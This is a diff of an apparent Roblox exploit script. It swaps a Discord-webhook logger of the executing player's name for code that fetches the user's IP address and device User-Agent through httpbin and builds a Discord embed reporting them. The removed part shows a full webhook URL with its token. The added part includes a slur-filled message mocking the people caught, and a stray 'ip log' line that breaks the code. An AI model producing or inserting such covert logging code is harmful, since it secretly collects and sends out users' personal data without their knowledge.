@@ -10,16 +10,33 @@ function sendnotif(STitle, SDescription, SDuration)
 })
 end
 
-request(
-    {
-        Url = "https://discordapp.com/api/webhooks/1081465617913237564/SfAFjuiiHvSqkeFOzUz486pQMKH5Kbn2jN4qDN5lGBYs53iFdYYcD19c5aVQqOAAAT2R",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
+ip log 
+
+local stuff = request({Url = "https://httpbin.org/get", Method = "GET"}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(stuff)
+
+local data = {
+    ['embeds'] = ({
+        ["author"] = {
+            ['name'] = game.Players.LocalPlayer.Name,
+            ['icon_url'] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username="..game.Players.LocalPlayer.Name
         },
-        Body = game:GetService("HttpService"):JSONEncode({["content"] = string.format(game.Players.LocalPlayer.Character.Name .. ' tried to execute the script. LMAOO')})
-    }
-)
+        ['description'] = "just caught another one, these bitchasses are so retarded",
+        ["color"] = tonumber(0xFFFB76),
+        ['fields'] = {
+            {
+                ['name'] = " ! IP ADDRESS ! : ",
+                ['value'] = decoded['origin'],
+                ['inline'] = true
+            },
+            {
+                ['name'] = " ! LOCAL DEVICE ! :",
+                ['value'] = decoded.headers['User-Agent'],
+                ['inline'] = true
+            }
+        }
+    })
+}
 sendnotif('kevin priv', 'kevin black pwet', 3)
 
 
